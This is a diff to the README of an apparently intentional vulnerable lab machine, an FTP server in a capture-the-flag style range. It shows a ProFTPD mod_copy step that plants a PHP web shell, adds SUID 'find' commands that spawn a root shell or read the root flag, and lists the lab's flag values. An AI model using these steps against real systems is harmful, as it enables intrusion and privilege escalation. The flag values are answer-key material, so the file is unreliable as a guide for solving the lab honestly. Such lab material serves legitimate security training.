@@ -1,4 +1,4 @@
-# 🏢 VulnCorp — Machine 3: dmz-ftp01 (FTP Server)
+﻿# 🏢 VulnCorp — Machine 3: dmz-ftp01 (FTP Server)
 
 > ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**
 
@@ -119,11 +119,21 @@ SITE CPTO /var/www/html/shell.php
 curl http://10.10.10.30/shell.php
 ```
 
+### 4. Privilege Escalation via SUID find (GTFOBins)
+
+```bash
+# Once a web shell is established (running as www-data):
+find . -exec /bin/sh -p \; -quit
+# Or directly view the root flag:
+find /root/root.txt -exec cat {} \;
+```
+
 ---
 
 ## 🏆 Flags
 
 - **Anonymous FTP Write Flag:** `/var/ftp/pub/flag1.txt` (`VULN{anon_ftp_wr1t3}`)
+- **ProFTPD mod_copy RCE Flag:** `/var/www/flag.txt` (`VULN{proftpd_rce_pwn3d}`)
 - **Leaked SSH Key Flag:** `/var/ftp/pub/keys/flag.txt` (`VULN{ssh_k3y_l3ak3d}`)
 - **Root Flag:** `/root/root.txt` (`VULN{ftp_s3rv3r_r00t3d_m4ch1n3_3}`)
 
